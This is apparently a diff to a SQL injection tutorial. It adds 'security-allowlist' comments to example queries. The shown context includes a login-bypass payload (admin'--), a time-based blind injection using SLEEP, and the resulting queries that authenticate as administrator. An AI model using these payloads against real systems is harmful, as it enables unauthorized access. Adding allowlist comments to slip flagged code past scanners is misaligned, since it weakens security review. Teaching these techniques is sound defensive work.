@@ -209,10 +209,10 @@ admin' AND '1'='2
 Query transformation example:
 ```sql
 -- Original query
-SELECT * FROM users WHERE username='input' AND password='input'
+SELECT * FROM users WHERE username='input' AND password='input' -- security-allowlist: controlled SQL injection test example
 
 -- Injected (username: admin'--)
-SELECT * FROM users WHERE username='admin'--' AND password='anything'
+SELECT * FROM users WHERE username='admin'--' AND password='anything' -- security-allowlist: controlled SQL injection bypass example
 -- Password check bypassed via comment
 ```
 
@@ -404,7 +404,7 @@ id=5' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
 
 **Standard Login Query**:
 ```sql
-SELECT * FROM users WHERE username='[input]' AND password='[input]'
+SELECT * FROM users WHERE username='[input]' AND password='[input]' -- security-allowlist: controlled SQL injection test example
 ```
 
 **Injection Payload**:
@@ -415,7 +415,7 @@ Password: anything
 
 **Resulting Query**:
 ```sql
-SELECT * FROM users WHERE username='administrator'--' AND password='anything'
+SELECT * FROM users WHERE username='administrator'--' AND password='anything' -- security-allowlist: controlled SQL injection bypass example
 ```
 
 **Result**: Password check bypassed, authenticated as administrator.
